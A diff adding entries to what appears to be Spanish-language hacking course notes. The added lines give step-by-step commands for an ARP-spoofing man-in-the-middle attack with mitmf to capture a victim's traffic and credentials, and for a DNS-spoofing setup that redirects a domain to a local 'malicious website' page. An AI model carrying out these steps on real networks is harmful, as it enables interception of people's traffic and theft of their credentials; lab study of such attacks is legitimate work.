@@ -538,6 +538,24 @@ rmdir <nombre directorio> (Borrar directorio)
 --- netstat (Comando para mostrar las conexiones que tiene la pc con windows)
 --- getmac (Comando para ver las direcciones mac de todas las interfaces de red)
 
+++ Man in the Middle Attack
+--- mitmf --arp --spoof --gateway <router_gateway> --target <ip_victima> -i <interface_ejemplo_eth0>
+--- route -n (Comando para conocer el gateway del router)
+--- Ir a la pc de la victima y probar la navegación web
+--- Volver a la máquina con kali, es la terminal se el tráfico de la víctima será visible, incluyendo credenciales
+
+++ Spoofing atack
+--- nano /etc/mitmf/mitmf.conf
+--- Ir a la sección A y colocar debajo algun dominio siguiendo la siguiente sintaxis: *.<dominio=ip_deseada_a_dirigirse> (ejemplo: *.tutorial.com=192.168.0.17
+--- Ctrl + G para guardar y Ctrl + X para salir
+--- cd /var/www/html (Dirección del servidor apache)
+--- nano index.html (Crea un archivo html)
+--- Editar el html con algún mensaje, ejemplo <h1> Malicious website </h1>
+--- Ctrl + G para guardar y Ctrl + X para salir 
+
+
+
+
 
 
 
